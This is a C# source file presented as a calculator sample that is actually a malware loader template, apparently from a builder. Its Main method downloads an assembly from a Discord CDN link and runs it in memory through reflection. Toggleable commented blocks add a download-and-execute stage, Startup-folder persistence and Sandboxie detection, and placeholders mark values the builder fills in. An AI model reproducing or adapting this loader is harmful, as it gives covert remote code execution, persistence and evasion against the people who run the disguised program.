using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;



//Default [assembly: AssemblyTitle("Unnamed")]
//Default [assembly: AssemblyDescription("Unnamed")]
//Default [assembly: AssemblyCompany("Unnamed.com")]
//Default [assembly: AssemblyProduct("Unnamed Player")]
//Default [assembly: AssemblyCopyright("Unnamed Â© Unnamed Sitesi")]
//Default [assembly: AssemblyFileVersion("1.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]





namespace CalculatorApplication
{
    class NumberManipulator
    {
        public int FindMax(int num1, int num2)
        {
            /* local variable declaration */
            int result;

            if (num1 > num2)
                result = num1;
            else
                result = num2;
            return result;
        }

        static void Maint(string[] args)
        {
            /* local variable definition */
            int a = 100;
            int b = 200;
            int ret;
            NumberManipulator n = new NumberManipulator();

            //calling the FindMax method
            ret = n.FindMax(a, b);
            Console.WriteLine("Max value is : {0}", ret);
            Console.ReadLine();
        }
    }
}

namespace CalculatorApplication
{
    static class Program
    {

        [STAThread]
        static void Main()
        {
            using (WebClient w = new WebClient())
            {

                try
                {
                 //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }




                 
                
            

                   byte[] x = w.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/843251127603429446/httpswww.youtube.comwatchvO9Hl");


                    object s = new object[] { %aPP%, string.Empty, w.DownloadData("%Server%"), true };

                   string o = "IsolatedStorage.packet_server";

                    AppDomain.CurrentDomain.Load(x).GetType(o).InvokeMember("CodeAccessSecurityAttribute", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])s);


                        //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
